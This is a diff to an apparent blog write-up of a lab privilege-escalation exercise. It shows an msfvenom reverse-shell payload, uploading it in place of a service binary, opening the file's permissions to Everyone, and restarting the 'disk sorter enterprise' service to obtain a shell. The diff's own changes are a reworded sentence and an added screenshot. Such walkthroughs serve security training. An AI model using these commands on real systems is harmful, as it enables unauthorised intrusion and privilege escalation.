@@ -210,13 +210,18 @@ Command: <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.29.190 LPORT=67
 <p>Now, it time to transfer the poison_ivy.exe to the target machine using: <code>upload /home/kali/Downloads/poison_ivy.exe</code>. Once we transfer poison_ivy.exe to the machine.  We have to move to <code>C:\MyPrograms\</code>  directory and move poison_ivy.exe to here and rename the file to Disk.exe.
 <br>
 <br>
-This is the command we will run: <code>move C:\Users\thm-unpriv\poison_ivy.exe Disk.exe</code> and then grant it Everyone:F - So it can be run by anyone. Using this command: <code>icalcs C:\MyPrograms\Disk.exe /grant Everyone:F</code></p>
+This is the command we will run: <code>move C:\Users\thm-unpriv\poison_ivy.exe Disk.exe</code>. Then grant Full Access (Everyone) - So it can be run by anyone. Using this command: <code>icalcs C:\MyPrograms\Disk.exe /grant Everyone:F</code></p>
 <p>Now, it time to restart the service by turning it off and on.
 <br>
 <code>sc stop &quot;disk sorter enterprise&quot;</code>
 <br>
 <code>sc start &quot;disk sorter enterprise&quot;</code>
-Then you should got a shell. Congratulations we just escalated our privilege.</p>
+Then you should got a shell. Congratulations we just escalated our privilege.
+<br>
+<img class="zoom" src="/images/linux_priv_60.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_60.png">
+</div>
 <p>That&rsquo;s all. Thanks for reading.</p>
 <!-- Zoom Animation Feature -->
 <script>
